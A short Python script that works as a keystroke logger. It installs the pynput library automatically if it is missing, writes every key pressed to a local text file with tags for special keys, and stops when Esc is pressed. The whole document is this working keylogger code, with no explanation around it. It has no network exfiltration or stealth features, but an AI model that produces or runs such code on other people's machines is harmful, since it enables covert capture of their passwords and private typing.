import subprocess
import sys

try:
    from pynput import keyboard
except ModuleNotFoundError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    from pynput import keyboard

log_file = "keystrokes.txt"

with open(log_file, "a") as file:

    def on_press(key):

        try:
            file.write(f"{key.char}")
        except AttributeError:
            if key == keyboard.Key.space:
                file.write("[SPACE]")
            elif key == keyboard.Key.enter:
                file.write("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            else:
                file.write(f"[{key}]")

    def on_release(key):

        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

print(f"Saved {log_file}")
